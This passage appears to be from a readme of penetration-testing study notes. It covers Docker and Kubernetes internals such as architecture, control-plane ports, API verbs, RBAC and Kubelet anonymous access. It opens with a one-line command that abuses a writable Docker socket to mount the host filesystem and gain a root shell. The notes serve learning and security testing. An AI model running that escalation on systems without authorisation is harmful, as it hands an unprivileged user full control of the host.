readme.org
*** Writable Socket
A case that can also occur is when the Docker socket is writable. Usually, this socket is located in ~/var/run/docker.sock~. However, the location can understandably be different. Because basically, this can only be written by the root or docker group. If we act as a user, not in one of these two groups, and the Docker socket still has the privileges to be writable, then we can still use this case to escalate our privileges.
#+BEGIN_SRC bash
  docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
#+END_SRC
** Kubernetes
[[https://kubernetes.io/][Kubernetes]], or ~K8s~ is a technology that has revolutionized ~devops~ processes
One of the key features of Kubernetes is its adaptability and compatibility with various environments. This platform offers an extensive range of features that enable developers and system administrators to easily configure, automate, and scale their deployments and applications.

Kubernetes is a container orchestration system, which functions by running all applications in containers isolated from the host system through ~multiple layers of protection~.
*** K8s Concept
Kubernetes revolves around the concept of pods, which can hold one or more closely connected containers. Each pod functions as a separate virtual machine on a node, complete with its own IP, hostname, and other details. Kubernetes simplifies the management of multiple containers by offering tools for load balancing, service discovery, storage orchestration, self-healing, and more. Despite challenges in security and management, K8s continues to grow and improve with features like ~Role-Based Access Control~ (~RBAC~), ~Network Policies~, and ~Security Contexts~, providing a safer environment for applications.
*** Different between K8 and Docker
| *Function*   | *Docker*                           | *Kubernetes*                                    |
|------------+----------------------------------+-----------------------------------------------|
| ~Primary~    | Platform for containerizing Apps | An orchestration tool for managing containers |
| ~Scaling~    | Manual scaling with Docker swarm | Automatic scaling                             |
| ~Networking~ | Single network                   | Complex network with policies                 |
| ~Storage~    | Volumes                          | Wide range of storage options                 |
*** Architecture
Kubernetes architecture is primarily divided into two types of components:
- ~The Control Plane~ (master node), which is responsible for controlling the Kubernetes cluster
- ~The Worker Nodes~ (minions), where the containerized applications are run
**** Nodes
The master node hosts the Kubernetes ~Control Plane~, which manages and coordinates all activities within the cluster and it also ensures that the cluster's desired state is maintained. On the other hand, the ~Minions~ execute the actual applications and they receive instructions from the Control Plane and ensure the desired state is achieved.
**** Control Plane
The Control Plane serves as the management layer. It consists of several crucial components, including:
| *Service*               | *TCP Ports* |
|-----------------------+-----------|
| etcd                  | 2379,2380 |
| API server            |      6443 |
| Scheduler             |     10251 |
| Controller Manager    |     10252 |
| Kubelet API           |     10250 |
| Read-Only Kubectl API |     10255 |
These elements enable the ~Control Plane~ to make decisions and provide a comprehensive view of the entire cluster.
**** Minions
Within a containerized environment, the ~Minions~ (worker nodes) serve as the designated location for running applications. It's important to note that each node is managed and regulated by the Control Plane, which helps ensure that all processes running within the containers operate smoothly and efficiently.

The ~Scheduler~, based on the ~API server~, understands the state of the cluster and schedules new pods on the nodes accordingly. After deciding which node a pod should run on, the API server updates the ~etcd~.

Understanding how these components interact is essential for grasping the functioning of Kubernetes. The API server is the entry point for all the administrative commands, either from users via kubectl or from the controllers. This server communicates with etcd to fetch or update the cluster state.
*** K8's Security Measures
Kubernetes security can be divided into several domains:
 - Cluster infrastructure security
 - Cluster configuration security
 - Application security
 - Data security
Each domain includes multiple layers and elements that must be secured and managed appropriately by the developers and administrators.
*** Kubernetes API
The core of Kubernetes architecture is its API that plays a crucial role in facilitating seamless communication and control within the Kubernetes cluster.

Each unique resource comes equipped with a distinct set of operations that can be executed, including but not limited to:
| *Request* | *Description*                                                    |
|---------+----------------------------------------------------------------|
| GET     | Retrieves information about a resource or a list of resources. |
| POST    | Creates a new resource.                                        |
| PUT     | Updates an existing resource.                                  |
| PATCH   | Applies partial updates to a resource.                         |
| DELETE  | Removes a resource.                                            |
*** Authentication
In terms of authentication, Kubernetes supports various methods which serve to verify the user's identity.
Once the user has been authenticated, Kubernetes enforces authorization decisions using Role-Based Access Control (~RBAC~). This technique involves assigning specific roles to users or processes with corresponding permissions to access and operate on resources. This technique involves assigning specific roles to users or processes with corresponding permissions to access and operate on resources.

In Kubernetes, the ~Kubelet~ can be configured to permit ~anonymous access~. By default, the Kubelet allows anonymous access. Anonymous requests are considered unauthenticated, which implies that any request made to the Kubelet without a valid client certificate will be treated as anonymous. 
